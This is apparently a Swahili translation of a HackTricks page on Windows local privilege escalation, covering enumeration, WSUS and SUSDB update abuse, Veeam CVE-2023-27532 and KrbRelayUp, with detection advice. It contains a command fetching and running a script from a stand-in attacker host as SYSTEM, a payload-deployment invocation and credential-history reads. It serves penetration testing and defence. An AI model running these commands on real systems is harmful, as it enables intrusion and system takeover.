# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unaunganisha mbinu za jumla za Windows privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mtiririko wake wa vitendo wa ukaguzi pia unatokana na warsha na orodha za ukaguzi za jamii.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Nyenzo za kihistoria kuhusu mashambulizi zinajumuisha wasilisho la DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui access tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels katika Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna mambo mbalimbali katika Windows yanayoweza **kukuzuia kukagua mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na **kukagua** **mbinu hizi zote za** **ulinzi** kabla ya kuanza ukaguzi wa privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili pia unaweza kubadilisha uhariri wa NVRAM ya UEFI ukiwa nje ya mtandao kuwa DMA ya kabla ya kuwasha mfumo na mnyororo wa kurekebisha kumbukumbu ya Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

Michakato ya UIAccess inayoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa vibaya kufikia High IL bila maonyo wakati ukaguzi wa AppInfo wa secure-path umepitwa. Angalia mtiririko maalum wa bypass ya UIAccess/Admin Protection hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa mipangilio ya registry ya ufikivu kwenye Secure Desktop unaweza kutumiwa vibaya kuandika thamani yoyote kwenye registry ya SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Matoleo ya hivi karibuni ya Windows pia yameleta njia ya LPE ya **SMB arbitrary-port**, ambapo uthibitishaji wa NTLM wa ndani wenye ruhusa za juu huakisiwa kupitia muunganisho wa TCP wa SMB uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Ukaguzi wa taarifa za toleo

Angalia kama toleo la Windows lina udhaifu wowote unaojulikana (pia angalia masasisho yaliyosakinishwa).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Toleo

[Site](https://msrc.microsoft.com/update-guide/vulnerability) hii ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Database hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **eneo kubwa la mashambulizi** linalotolewa na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson ndani yake)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — huorodhesha OS build, updates zilizosakinishwa, na advisory candidates zilizochaguliwa; thibitisha bidhaa halisi na updates zilizochukua nafasi ya nyingine kabla ya kuchukulia matokeo kuwa yanahusika.

Kwa local exploit inayohusiana na toleo maalum, angalia **usanifu wa process inayoendeshwa** pamoja na usanifu wa OS. Kwenye Windows ya 64-bit, process ya 32-bit huathiriwa na [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekeza kwenye directory ya mfumo wa 32-bit, ilhali `%windir%\Sysnative` huwezesha process hiyo kufikia directory asili ya mfumo. Alias hii haipatikani kwa process ya 64-bit. OS build au uwezekano wa KB kukosekana havithibitishi kuwa exploit inaweza kutumika; linganisha build inayoendeshwa, update iliyosakinishwa au iliyochukua nafasi ya nyingine, usanifu wa process, na masharti ya exploit na [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) ya suala husika.

Kwa mfano wa service-memory-corruption, tazama [client-controlled MIDI shared-memory ring offsets](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Stack offsets zilizochapishwa zinatumika tu kwa build iliyojaribiwa; kupata `LOCAL SERVICE` ni hatua tofauti na hatua inayofuata ya [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) ya kupata `SYSTEM`.<sup>[[44]](#references)</sup>

**Ndani ya mfumo kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos za GitHub za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info iliyohifadhiwa kwenye env variables?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha hili katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili kwenye folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda ya pamoja au iliyofichwa. Kagua njia halisi ya kuhifadhi na ACL ya faili kabla ya kukagua transcript: inaweza kuwa na hoja za amri na matokeo, ikijumuisha credentials. Transcript inayosomeka ni kidokezo tu ikiwa maudhui yake yanaonyesha utambulisho wa kiwango cha juu unaoweza kutumiwa na utambulisho huo unaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline ya PowerShell hurekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo yasiwe yamenaswa.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye logi za PowerShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script huhifadhiwa, na kuhakikisha kwamba kila block ya code inaandikwa inapotekelezwa. Mchakato huu huhifadhi audit trail ya kina ya kila shughuli, ambayo ni muhimu kwa forensics na kuchanganua tabia hasidi. Kwa kurekodi shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato hupatikana.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana ndani ya Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Viendeshi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Mwongozo wa awali ulifupisha hatari kama ifuatavyo:

Unaweza kuhatarisha mfumo ikiwa masasisho yataombwa kupitia http badala ya http**S**.

Endpoint ya WSUS inayotumia HTTP ni kigezo cha kuchunguza uwezekano wa kunasa metadata ya masasisho. Unyonyaji pia hutegemea ikiwa mteja anatumia seva hiyo ya WSUS, ikiwa mshambuliaji anaweza kunasa au kudhibiti trafiki yake, na sera za mteja za kuamini na kusakinisha masasisho. URL pekee haithibitishi kuwa utekelezaji wa msimbo unawezekana. [Microsoft inapendekeza TLS kwa metadata ya WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Anza kwa kuangalia ikiwa mtandao unatumia masasisho ya WSUS yasiyo ya SSL kwa kuendesha yafuatayo kwenye cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipokea jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kauli ya awali kuhusu uwezekano wa kutumika ilikuwa:

Basi, **inaweza kutumiwa vibaya.** Ikiwa thamani ya mwisho ya registry ni sawa na 0, basi ingizo la WSUS litapuuzwa.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intraneti iliyosanidiwa. Hii inathibitisha sharti la awali kwa njia ya kunasa trafiki ya HTTP, lakini haithibitishi kwamba kunasa trafiki, kukubali masasisho hasidi, au kusakinisha kwa ruhusa za juu kunawezekana. Ikiwa ni `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haitachaguliwa na sera hiyo.

Ili kutumia udhaifu huu vibaya, unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za mashambulizi za MiTM zilizowekwa tayari ili kuingiza masasisho 'bandia' kwenye trafiki ya WSUS isiyo ya SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, huu ndio udhaifu unaotumiwa na hitilafu hii:

> Ikiwa tuna uwezo wa kubadilisha proxy ya mtumiaji wetu wa ndani, na Windows Updates inatumia proxy iliyosanidiwa kwenye mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya kifaa chetu ili kunasa trafiki yetu na kuendesha msimbo kama mtumiaji mwenye ruhusa za juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, itatumia pia hifadhi ya vyeti yake. Tukitengeneza cheti kilichosainiwa binafsi kwa jina la seva pangishi ya WSUS na kukiongeza kwenye hifadhi ya vyeti ya mtumiaji wa sasa, tutaweza kunasa trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii utaratibu wowote unaofanana na HSTS ili kutekeleza uthibitishaji wa aina ya trust-on-first-use kwa cheti. Ikiwa cheti kilichowasilishwa kinaaminika na mtumiaji na kina jina sahihi la seva pangishi, huduma itakikubali.

Unaweza kutumia udhaifu huu vibaya kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara tu itakapotolewa).

### Masasisho ya WSUS yanayodhibitiwa na msimamizi

Njia tofauti ipo pale utambulisho wa sasa unapoweza **kuchapisha na kuidhinisha** masasisho kwenye seva ya WSUS. Kagua uanachama unaotumika wa kundi la `WSUS Administrators` la seva na ruhusa zozote za WSUS zilizokasimiwa, kisha tambua kundi la kompyuta za wateja litakalopokea sasisho lililoidhinishwa. [Microsoft inahitaji ruhusa za WSUS Administrator ili kuidhinisha masasisho](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini cheti cha kusaini kinachotumika kwa maudhui yaliyochapishwa ndani ya mfumo. Thibitisha kuwa sasisho husika limesainiwa na linakubaliwa, linahusika na lengwa, na linasakinishwa katika muktadha wenye ruhusa za juu zaidi kabla ya kuchukulia hili kama njia ya kupandisha ruhusa. Thamani ya HTTP `WUServer` au jina la kundi pekee havithibitishi masharti hayo.

### Matumizi mabaya ya masasisho maalum ya SUSDB: payload zisizosainiwa kupitia `.txt`/`.esd`

Huu ni uvunjaji tofauti wa mpaka wa uaminifu na kunasa muunganisho wa HTTP wa WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha wa **stored procedures za hifadhidata ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha sasisho maalum. Njia moja ya vitendo ya kuingia ni kurudisha uthibitishaji wa akaunti ya kompyuta ya WSUS ya juu kwenda kwa seva tofauti ya MSSQL inayopangisha `SUSDB`; sharti kamili hutegemea usanidi, kwa hiyo kwanza orodhesha ruhusa za `EXECUTE` badala ya kudhani kuwa haki za msimamizi wa SQL zinahitajika.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya mashambulizi inayorudisha uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 kwenda LDAP, SMB, au AD CS, tazama [Kutumia vibaya HTTP ya WSUS kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Thibitisha relay ya hifadhidata ya nje na ruhusa za procedures

Katika usanidi ambapo WSUS hutumia SQL Server ya nje, kwanza hakikisha kama akaunti ya seva ya WSUS inaweza kuthibitisha utambulisho wake kwenye hifadhidata na kama NTLM relay inaweza kufikia listener hiyo. Jukumu la SQL la seva linaweza kuruhusu procedures za kuchapisha masasisho hata wakati uandishi wa moja kwa moja kwenye jedwali umekataliwa; `UPDATE` iliyoshindwa kwenye `SUSDB` haithibitishi kuwa uchapishaji umezuiwa. Kagua utambulisho unaotumika, uanachama wa role, na ruhusa za procedures katika kipindi cha SQL kilichoidhinishwa kabla ya kujaribu sasisho maalum.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Ufafanuzi wa procedures zinazotumika na `SoftwareDistributionPackage.xsd` iliyosakinishwa ni muhimu unaporekebisha metadata halali ya update. Parent ya bundle na child ya payload kila moja zinahitaji `UpdateIdentity` (aina ya fragment `1`), `LocalizedProperties` (`4`), na `ExtendedProperties` (`2`); hifadhi local revision ID inayorejeshwa na kila mwito wa `spImportUpdate` na uhakikishe uhusiano wa bundle, digests, ukubwa, content URL, na revision vinaendana. Huu ni mtiririko wa uchapishaji unaotegemea hali, kwa hivyo mwito mmoja wa stored procedure uliofaulu si uthibitisho kwamba utekelezaji ulifanyika upande wa client.<sup>[[38]](#references)</sup>

#### Jenga, lenga na uidhinishe update

Mtiririko wa custom-update hutumia procedures halali za WSUS kama API yenye vizuizi ya uchapishaji. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya update | `spImportUpdate` |
| Hifadhi vipande vya XML vya prerequisites, vilivyolocalizewa na vilivyopanuliwa | `spSaveXMLFragment` |
| Husisha digest ya maudhui na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/unda kundi la kompyuta na uongeze client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kundi hilo | `spDeployUpdate` yenye `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digests, ukubwa na handler ya `CommandLineInstallation` lazima viendane katika metadata/vipande vilivyoingizwa. Baada ya kuweka content URL na kundi lengwa, idhini ya mwisho hufanana na ifuatayo; tumia vitambulishi vipya vya update, kundi na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS kwa kawaida hukataa maudhui holela ya executable ambayo hayajasainiwa. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka flag ya ukaguzi wa certificate kuwa false ikiwa jina la faili lililotolewa linaishia kwa `.txt` au `.esd`; kisha `CheckCertificateSignature` hurukwa bila kuthibitisha kwanza kwamba bytes ni maandishi au picha halali ya ESD. Kwa hivyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita ukaguzi wa maudhui na baadaye kuzinduliwa na handler ya usakinishaji wa command-line ya update. Hili ni kosa la policy/type-confusion, si kughushi saini.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging na automation inayooendana na BITS

Kuitisha `spDeployUpdate` hufanya WSUS ichukue maudhui yaliyosajiliwa. Origin lazima itimize matarajio ya BITS kuhusu HTTP: URL inayofikika pekee haitoshi kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Server isiyounga mkono Range husababisha tukio la WSUS la synchronization `EventId=364`, linalosema kuwa BITS inahitaji kichwa cha Range protocol.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) hutengeneza SQL inayohitajika kwa mfuatano wa import/fragment/URL/group/deployment, inajumuisha client ya MSSQL iliyorekebishwa kwa ajili ya kuitekeleza, na huja na `BitsWebServer.py` kwa staging ya maudhui. Mfano wa chini kabisa wa matumizi katika lab iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji bila mtumiaji na persistence ya majaribio upya

Mwingiliano wa upande wa mteja hutegemea sera. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo `4 - Auto download and schedule install`, husababisha update iliyoidhinishwa kupakuliwa na kusakinishwa kwa ratiba iliyowekwa bila mtumiaji kuichagua mwenyewe. Katika majaribio, payload ambayo update yake ilibaki imeshindwa/isiyokamilika ilitolewa tena mara moja baada ya mchakato wa callback kutoka, kwa hiyo tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji unaojirudia; huacha viashiria vingi kwa sababu mteja huonyesha hali ya update iliyoshindwa.<sup>[[39]](#references)</sup>

#### Mielekeo ya ugunduzi na kuimarisha usalama

Mielekeo muhimu ya upande wa seva na mteja kutoka kwenye mnyororo huu ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate` kwenye `SUSDB`; chunguza makundi mapya ya ulengaji, vyanzo vya maudhui vya nje, payload za update za `.txt`/`.esd` na deployments zilizofanywa na principal zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` kwa `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (imeandikwa vibaya), na `EventId=364`; linganisha uthibitishaji na kiendelezi cha payload pamoja na magic ya maudhui badala ya kuamini kiambishi tamati.
- Tafuta hali ambapo usakinishaji wa Windows Update unashindwa/kujaribiwa tena mara kwa mara, na utekelezaji wa PE au shughuli zisizotarajiwa za child/network kutoka kwa maudhui yenye majina ya `.txt` au `.esd`.
- Hitaji Extended Protection for Authentication kwenye huduma ya hifadhidata inapoungwa mkono, na zuia ufikiaji wa mtandao wa hifadhidata kwa seva ya WSUS na mifumo ya kiutawala iliyoidhinishwa. Punguza na kagua haki za `EXECUTE` kwenye taratibu za custom-update.

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Mawakala wengi wa biashara hutoa uso wa IPC wa localhost na chaneli ya update yenye ruhusa za juu. Ikiwa usajili unaweza kulazimishwa kuelekezwa kwenye seva ya mshambulizi na updater ikaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI hasidi ambayo huduma ya SYSTEM itasakinisha. Tazama mbinu ya jumla (iliyotokana na mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Maelezo ya awali yaliyohusu toleo maalum na dokezo la upelelezi yalikuwa:

Veeam B&R < `11.0.1.1261` hutoa huduma ya localhost kwenye **TCP/9401** inayochakata ujumbe unaodhibitiwa na mshambulizi, na kuruhusu amri holela kutekelezwa kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Upelelezi**: thibitisha listener na toleo, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication na Cloud Connect hutumia huduma kuu ya backup kwenye **TCP/9401 kwa chaguo-msingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji uthibitishaji wa credentials zilizosimbwa kwa njia fiche za hifadhidata ya usanidi ndani ya eneo la mtandao wa backup; PoC nyingine ya umma inaonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Huenda huduma ikafungamana na anwani nyingine mbali na localhost, kwa hiyo kagua anwani na PID yake halisi.

- **Upelelezi**: thibitisha kuwa TCP/9401 ni ya `Veeam.Backup.Service.exe`, kisha kagua bidhaa iliyosakinishwa na metadata ya patch. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patch.
- **Matoleo ya kwanza yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kama matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathirika. Toleo la faili lenye sehemu nne pekee haliwezi kutofautisha build ya msingi isiyopata patch na patch ya baadaye kwenye namba hizo hizo za build. Thibitisha kitambulisho cha patch dhidi ya [historia ya build ya muuzaji](https://www.veeam.com/kb2680) kabla ya kusema kuwa build ya mpaka imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na DLL za Veeam zinazohitajika kwenye saraka moja, kisha washa payload ya SYSTEM kupitia socket ya ndani:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Huduma hutekeleza amri kama SYSTEM.

PoC iliyotajwa inaonyesha utekelezaji wa amri kama SYSTEM pale masharti yake ya ziada yanapotimizwa; ushauri wa vendor unaelezea tatizo la kufichuliwa kwa credentials.

## KrbRelayUp

Maelezo ya awali kuhusu mazingira ya kawaida yalikuwa:

Kuna athari ya **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya yanajumuisha mazingira ambamo **LDAP signing hailazimishwi,** watumiaji wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na watumiaji wana uwezo wa kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba **mahitaji** haya hutimizwa kwa kutumia **mipangilio ya kawaida**.

Relay ya Kerberos ya ndani inaweza kuvuka kutoka kwa logon yenye mamlaka ya chini hadi kwenye uandishi wenye mamlaka ya juu kwenye directory, pale COM server inayofaa inapothibitisha utambulisho wake na principal inayotumwa kupitia relay ikiwa na ruhusa kwenye object lengwa. [Nyaraka za KrbRelay](https://github.com/cube0x0/KrbRelay) zinaeleza uandishi wa LDAP wa RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha baadhi ya njia hizi kiotomatiki. Mnyororo wa RBCD unahitaji ruhusa zinazofaa za delegation na kwenye object lengwa, huku mnyororo wa shadow-credential ukihitaji ruhusa za kuandika key-credential na KDC inayotumia njia ya uthibitishaji wa certificate. Hakuna njia kati ya hizi inayotokana na kuwa mwanachama wa domain pekee.

Kagua sera halisi ya DC ya [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya utambulisho unaotumwa kupitia relay, pamoja na viwango vya uthibitishaji na uigaji-utambulisho vya COM class iliyochaguliwa. Aina ya logon ya caller na muktadha wa credentials ni muhimu: kikao cha WinRM kinaweza kutenda tofauti na logon ya mwingiliano au ya new-credentials. Firewall/OXID routing na masasisho yaliyosakinishwa pia yanaweza kubadilisha matokeo. Chukulia sera inayoruhusu au ACL inayolingana kama jambo la kuchunguzwa; enumeration tulivu haipaswi kuanzisha COM coercion, relay authentication, au uandishi kwenye directory. Shadow credential ya machine account inaweza kusababisha machine ticket na, ikiwa tu akaunti hiyo ina ruhusa zinazohitajika za directory replication, njia tofauti ya DCSync.

